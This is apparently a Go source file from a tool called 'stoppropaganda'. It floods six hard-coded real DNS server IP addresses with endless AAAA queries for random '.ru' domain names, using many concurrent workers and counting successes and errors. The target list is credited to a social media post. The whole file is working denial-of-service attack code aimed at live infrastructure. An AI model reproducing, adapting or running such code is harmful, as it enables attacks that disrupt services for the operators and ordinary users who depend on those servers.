package stoppropaganda

import (
	"math/rand"
	"strings"
	"sync"

	"github.com/miekg/dns"
)

// Source: https://twitter.com/FedorovMykhailo/status/1497642156076511233

var targetDNSServers = map[string]struct{}{
	"194.54.14.186:53":  {},
	"194.54.14.187:53":  {},
	"194.67.7.1:53":     {},
	"194.67.2.109:53":   {},
	"84.252.147.118:53": {},
	"84.252.147.119:53": {},
}

type DNSServer struct {
	Requests     uint   `json:"requests"`
	Success      uint   `json:"success"`
	Errors       uint   `json:"errors"`
	LastErrorMsg string `json:"last_error_msg"`

	mux     *sync.Mutex
	message *dns.Msg
	target  string
}

var dnsServers = map[string]*DNSServer{}

func startDNS() {
	for targetDNSServer := range targetDNSServers {
		dnsServers[targetDNSServer] = &DNSServer{
			mux:     &sync.Mutex{},
			message: new(dns.Msg),
			target:  targetDNSServer,
		}
		questionDomain := getRandomDomain() + "."
		dnsServers[targetDNSServer].message.SetQuestion(questionDomain, dns.TypeAAAA)
	}

	dnsChannel := make(chan *DNSServer, *flagDNSWorkers)

	// Spawn workers
	for i := 0; i < *flagWorkers; i++ {
		go runDNSWorker(dnsChannel)
	}

	// Issue tasks
	go func() {
		for {
			for _, dns := range dnsServers {
				dnsChannel <- dns
			}
		}
	}()
}

func runDNSWorker(c chan *DNSServer) {
	for {
		dnsServer := <-c
		_, _, err := dnsClient.Exchange(dnsServer.message, dnsServer.target)

		dnsServer.mux.Lock()
		dnsServer.Requests++
		if err != nil {
			dnsServer.Errors++
			switch {
			case strings.HasSuffix(err.Error(), "no such host"):
				dnsServer.LastErrorMsg = "Host does not exist"
			case strings.HasSuffix(err.Error(), "connection refused"):
				dnsServer.LastErrorMsg = "Connection refused"
			case strings.HasSuffix(err.Error(), "i/o timeout"):
				dnsServer.LastErrorMsg = "Query timeout"
			default:
				dnsServer.LastErrorMsg = err.Error()
			}
		} else {
			dnsServer.Success++
		}
		dnsServer.mux.Unlock()
	}
}

var randomDomainRunes = []rune("abcdefghijklmnopqrstuvwxyz")

func getRandomDomain() string {
	randomLength := rand.Intn(20-6) + 6 // from 6 to 20 characters length + ".ru"
	b := make([]rune, randomLength)
	for i := range b {
		b[i] = randomDomainRunes[rand.Intn(len(randomDomainRunes))]
	}
	return string(b) + ".ru"
}
